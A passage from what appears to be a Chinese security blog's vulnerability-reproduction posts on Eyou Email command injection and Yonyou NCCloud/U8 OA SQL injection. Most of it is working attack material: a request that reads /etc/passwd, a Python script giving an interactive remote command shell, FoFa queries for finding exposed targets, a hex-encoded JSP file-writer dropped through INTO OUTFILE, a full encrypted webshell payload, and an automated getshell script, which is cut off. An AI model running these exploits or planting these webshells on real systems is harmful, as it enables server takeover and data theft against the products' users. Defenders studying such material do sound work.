class="hljs-string">https://github.com/PeiQi0/PeiQi-WIKI-POC/</span><br><br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://z3.ax1x.com/2021/07/13/WFb1w8.png" alt=""></p><p>发送请求包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">POST /webadm/?q=moni_detail.do&amp;action=gragh HTTP/1.1<br>Host: 36.x.x.x:88<br>Content-Length: 25<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36<br><br>type=&#x27;|cat /etc/passwd||&#x27;<br></code></pre></td></tr></table></figure><p><code>cat /etc/passwd</code></p><p><img src="https://z3.ax1x.com/2021/07/13/WFbGFg.png" alt=""></p><p>当前网络连接情况：</p><p><img src="https://z3.ax1x.com/2021/07/13/WFb3TS.png" alt=""></p><p>PY脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">title</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34mVersion: Eyou Email SYSTEM                                       \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[36mCmd         &gt;&gt;&gt; whoami                                            \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POC_1</span>(<span class="hljs-params">target_url, cmd</span>):<br>    vuln_url = target_url + <span class="hljs-string">&quot;/webadm/?q=moni_detail.do&amp;action=gragh&quot;</span><br>    headers = &#123;<br>            <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;<br>    data = <span class="hljs-string">&quot;type=&#x27;|cat /etc/passwd||&#x27;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.post(url=vuln_url, headers=headers, data=data, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 正在请求 &#123;&#125;//webadm/?q=moni_detail.do&amp;action=gragh \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;root&quot;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞 ,成功执行 cat /etc/passwd \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(response.text))<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\033[35mCmd &gt;&gt;&gt; \033[0m&quot;</span>)<br>                <span class="hljs-keyword">if</span> cmd == <span class="hljs-string">&quot;exit&quot;</span>:<br>                    sys.exit(<span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    POC_2(target_url, cmd)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POC_2</span>(<span class="hljs-params">target_url, cmd</span>):<br>    vuln_url = target_url + <span class="hljs-string">&quot;/webadm/?q=moni_detail.do&amp;action=gragh&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;<br>    data = <span class="hljs-string">&quot;type=&#x27;|&#123;&#125;||&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(cmd)<br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.post(url=vuln_url, headers=headers, data=data, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(response.text))<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    title()<br>    cmd = <span class="hljs-string">&#x27;cat /etc/passwd&#x27;</span><br>    target_url = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))<br>    POC_1(target_url, cmd)<br></code></pre></td></tr></table></figure><p>Reference</p><p><a href="http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">http://wiki.peiqi.tech/PeiQi_Wiki/Web应用漏洞/亿邮/亿邮电子邮件系统远程命令执行漏洞.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
      <tag>PoC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Yonyou-NC-injection-vulnerability</title>
    <link href="/posts/6c99903e.html"/>
    <url>/posts/6c99903e.html</url>
    
    <content type="html"><![CDATA[<h3 id="用友-NCCloud-FS文件管理">用友 NCCloud FS文件管理</h3><p>登录页面对用户名参数没有过滤，存在SQL注入。</p><p>FoFa</p><p><code>&quot;NCCloud&quot;</code></p><p>​登录页面这样子：</p><p><img src="https://z3.ax1x.com/2021/07/13/WFHtr6.png" alt=""></p><p><a href="http://xxx.xxx.xxx.xxx/fs/">http://xxx.xxx.xxx.xxx/fs/</a></p><p>登录请求包如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">GET /fs/console?username=test&amp;password=DESX6dwAYlg6KF%2FlkR28c48speMx%2BQDwjnBDfMdTN%2Fk%3D HTTP/1.1<br>Host: x.x.x.x:8081<br>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0; en_US) Gecko/20100101 Firefox/87.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>DNT: 1<br>Connection: close<br>Referer: http://www.baidu.com:7001/<br>Cookie: JSESSIONID=0000GZxOjXIxEy1EVEb6NAiIKVx:1bsd2unpa<br>Upgrade-Insecure-Requests: 1<br>X-Forwarded-For: 8.8.8.6<br>X-Originating-IP: 8.8.8.6<br>X-Remote-IP: 8.8.8.6<br>X-Remote-Addr: 8.8.8.6<br></code></pre></td></tr></table></figure><p>对 <code>username</code> 进行注入</p><p><img src="https://z3.ax1x.com/2021/07/13/WFHYKx.png" alt=""></p><h3 id="用友-U8-OA-test-jsp-SQL注入漏洞">用友 U8 OA test.jsp SQL注入漏洞</h3><p>原文：<a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B">http://wiki.peiqi.tech/PeiQi_Wiki/OA产品漏洞/用友OA/用友</a> U8 OA test.jsp SQL注入漏洞.html</p><p>用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞。</p><h4 id="FoFa-搜">FoFa 搜</h4><p><code>&quot;用友U8-OA&quot;</code></p><p><a href="http://x.x.x.x:8082/yyoa/index.jsp">http://x.x.x.x:8082/yyoa/index.jsp</a></p><p><img src="https://z3.ax1x.com/2021/07/13/WFHBPH.png" alt=""></p><h4 id="PoC">PoC</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>yyoa<span class="hljs-operator">/</span>common<span class="hljs-operator">/</span>js<span class="hljs-operator">/</span>menu<span class="hljs-operator">/</span>test.jsp?doType<span class="hljs-operator">=</span><span class="hljs-number">101</span><span class="hljs-operator">&amp;</span>S1<span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>MD5(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/07/13/WFHwIe.png" alt=""></p><h4 id="构造Payload获取路径">构造Payload获取路径</h4><p><code>/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20@@basedir)</code></p><p><img src="https://z3.ax1x.com/2021/07/13/WFHdaD.png" alt=""></p><p>得到物理路径 <code> E:\Program Files\UFIDA\U8_OA\mysql\bin..\</code></p><p>通过 into outfile 写入文件，这里因为 jsp木马存在特殊符号，使用 hex编码上传允许文件上传的jsp文件到：<code>D:/Program Files/UFIDA/U8-OA/tomcat/webapps/yyoa/</code>，即，根目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">http://x.x.x.x/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27D:/Program Files/UFIDA/U8-OA/tomcat/webapps/yyoa/3_upload.jsp%27<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/07/13/WFHrRA.png" alt=""></p><p>如上图则上传成功，访问 360_upload.jsp 为空白不报错页面不存在就是真正上传成功。</p><hr><p>发送请求包上传冰蝎webshell，需要进行url编码一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">POST /yyoa/360_upload.jsp?f=cdnwebshell.jsp HTTP/1.1<br>Host: xxxxxx<br>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0; en_US) Gecko/20100101 Firefox/87.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>DNT: 1<br>Connection: close<br>Cookie: JSESSIONID=1D7702B81816F505089A9BE889F796DF<br>Upgrade-Insecure-Requests: 1<br>X-Forwarded-For: 8.8.8.6<br>X-Originating-IP: 8.8.8.6<br>X-Remote-IP: 8.8.8.6<br>X-Remote-Addr: 8.8.8.6<br>Referer: http://www.baidu.com/<br>Content-Length: 669<br><br>t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/07/13/WFH6Mt.png" alt=""></p><h4 id="连接shell">连接shell</h4><p><a href="http://x.x.x">http://x.x.x</a>.//yyoa/cdnwebshell.jsp</p><p>不知道什么原因，冰蝎连接，一直提示获取秘钥失败，直接换哥斯拉，连接成功：</p><p><img src="https://z3.ax1x.com/2021/07/13/WFHsxI.png" alt=""></p><h4 id="自动化脚本">自动化脚本</h4><p>佩奇大佬的脚本</p><p>​检测注入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">title</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34m公众号  : PeiQi文库                                                   \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34mTitle     : 用友 U8 OA test.jsp SQL注入漏洞                           \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POC_1</span>(<span class="hljs-params">target_url</span>):<br>    vuln_url = target_url + <span class="hljs-string">&quot;/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20md5(1))&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,<br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.get(url=vuln_url, headers=headers, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞 \n[o] 响应地址: &#123;&#125; \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url, vuln_url))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    title()<br>    target_url = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))<br>    POC_1(target_url)<br></code></pre></td></tr></table></figure><p>getshell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">title</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34m公众号  : PeiQi文库                                                   \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34mVersion: 致远OA                                                   \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POC_1</span>(<span class="hljs-params">target_url</span>):<br>    vuln_url = target_url + <span class="hljs-string">&quot;/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20@@basedir)&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.get(url=vuln_url, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;序号&#x27;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;@@basedir&quot;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> response.status_code == <span class="hljs-number">200</span>:<br>            OA_dir = re.findall(<span class="hljs-string">r&#x27;&gt;(.*)\\UFseeyon\\&#x27;</span>, response.text)[<span class="hljs-number">0</span>]<br>            OA_dir = OA_dir[:<span class="hljs-number">2</span>] + <span class="hljs-string">&#x27;/&#x27;</span> + OA_dir[<span class="hljs-number">3</span>:]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞, 安装路径为:&#123;&#125; \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url, OA_dir))<br>            webshell_name = <span class="hljs-string">&quot;peiqi_upload&#123;&#125;.jsp&quot;</span>.<span class="hljs-built_in">format</span>(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">999</span>))<br>            OA_dir = OA_dir + <span class="hljs-string">&quot;/UFseeyon/OA/tomcat/webapps/yyoa/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(webshell_name)<br>            POC_2(target_url, OA_dir, webshell_name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url), e)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POC_2</span>(<span class="hljs-params">target_url, OA_dir, webshell_name</span>):<br>    vuln_url = target_url + <span class="hljs-string">&quot;/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27&#123;&#125;%27&quot;</span>.<span class="hljs-built_in">format</span>(OA_dir)<br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.get(url=vuln_url, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;already&#x27;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span>  response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 文件写入木马上传失败，目标已存在相同文件，请重新运行\033[0m&quot;</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;No Data&quot;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span>  response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 文件写入木马上传成功，上传路径为 &#123;&#125;\033[0m&quot;</span>.<span class="hljs-built_in">format</span>(OA_dir))<br>            POC_3(target_url, webshell_name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 目标 &#123;&#125; 木马上传失败 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url), e)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POC_3</span>(<span class="hljs-params">target_url, webshell_name</span>):<br>    rebe_webshell = <span class="hljs-string">&quot;peiqiwebshell&#123;&#125;.jsp&quot;</span>.<span class="hljs-built_in">format</span>(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">999</span>))<br>    vuln_url = target_url + <span class="hljs-string">&quot;/yyoa/&#123;&#125;?f=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(webshell_name, rebe_webshell)<br>    data = <span 